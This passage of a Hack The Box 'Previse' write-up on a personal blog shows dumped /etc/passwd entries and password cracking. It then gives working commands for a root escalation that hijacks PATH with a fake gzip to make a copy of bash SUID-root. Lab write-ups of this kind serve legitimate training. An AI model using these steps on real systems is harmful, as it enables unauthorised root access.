uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
</code></pre></div><p>So our target should be <code>m4lwhere</code> user.</p>
<p>At this point, let&rsquo;s just run John the Ripper (which I personally prefer over Hashcat, since configuring hardware things for hashcat in a virtual environment is quite daunting), and we&rsquo;d got <code>m4lwhere</code> password.</p>
<h2 id=ii-privilege-escalation>II. Privilege Escalation<a hidden class=anchor aria-hidden=true href=#ii-privilege-escalation>#</a></h2>
<p>Logging in SSH with the credentials of <code>m4lwhere</code>, we&rsquo;d got the user flag. Now it&rsquo;s time for vertical privilege escalation!</p>
<p>After some basic recons, this looks like the best shot we could have:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>m4lwhere@previse:~$ sudo -l
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> m4lwhere: 
User m4lwhere may run the following commands on previse:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /opt/scripts/access_backup.sh
</code></pre></div><p>So let&rsquo;s go for it!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
<span style=color:#75715e>#!/bin/bash</span>

<span style=color:#75715e># We always make sure to store logs, we take security SERIOUSLY here</span>

<span style=color:#75715e># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span style=color:#75715e># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_file_access.gz
</code></pre></div><p>Can you spot the vulnerability? Are we seeing eye to eye, or looking at different things? :D</p>
<p>I&rsquo;ve to admit, at first, I digged deep into the <code>date</code> hole. <code>date</code> binary can provide <a href=https://gtfobins.github.io/gtfobins/date/#sudo>file read access</a>, so I struggled to change the system date to my payload, without-root-access. It was pure hell. After giving up on it, I took another look at <code>access_backup.sh</code> and, god, why was I so blind about that relative <code>gzip</code>? What about path injection?</p>
<p>At first, I tried to directly execute <code>/bin/bash</code> through that injection, but it didn&rsquo;t work. So I tried a a workaround.</p>
<p>I copied <code>bash</code> to home, made a bash script that set SUID and change user of that binary, change <code>PATH</code> to inject it, and got root. Here&rsquo;s the script.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/usr/bin/bash
</span><span style=color:#75715e></span>chown root:root bash
chmod +s bash
</code></pre></div><p>The whole process can be described as:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>m4lwhere@previse:~$ cp /bin/bash ~
m4lwhere@previse:~$ mv script.sh ~/gzip
m4lwhere@previse:~$ export $PATH<span style=color:#f92672>=</span>/home/m4lwhere:$PATH
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
m4lwhere@previse:~$ bash -p
root@previse:/home/m4lwhere$ 
</code></pre></div><p>And that&rsquo;s it. The root flag! Don&rsquo;t forget to clean up your traces, for practicing purposes and for later players, everyone. :D</p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li>
<li><a href=https://git-akihakune.github.io/tags/tech/>tech</a></li>
<li><a href=https://git-akihakune.github.io/tags/english/>english</a></li>
</ul>
<nav class=paginav>
<a class=prev href=https://git-akihakune.github.io/blog/racecar/>
<span class=title>Â« Prev Page</span>
<br>
<span>Hack The Box Pwn challenge - racecar</span>
</a>
<a class=next href=https://git-akihakune.github.io/blog/myleetcodejourney/>
<span class=title>Next Page Â»</span>
<br>
<span>My Leetcode journey</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Previse writeup on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20-%20Previse%20writeup&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f&hashtags=ctf%2ctech%2cenglish"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Previse writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f&title=Hack%20The%20Box%20-%20Previse%20writeup&summary=Hack%20The%20Box%20-%20Previse%20writeup&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Previse writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f&title=Hack%20The%20Box%20-%20Previse%20writeup"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Previse writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Previse writeup on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20-%20Previse%20writeup%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Previse writeup on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20-%20Previse%20writeup&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fprevise%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer><script src=https://utteranc.es/client.js repo=git-akihakune/git-akihakune.github.io issue-term=pathname theme=photon-dark crossorigin=anonymous async></script>
</article>
</main>
<footer class=footer>
<span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
- Aki Hakune
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:'rgba(0, 0, 0, 0.8)'})})</script>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>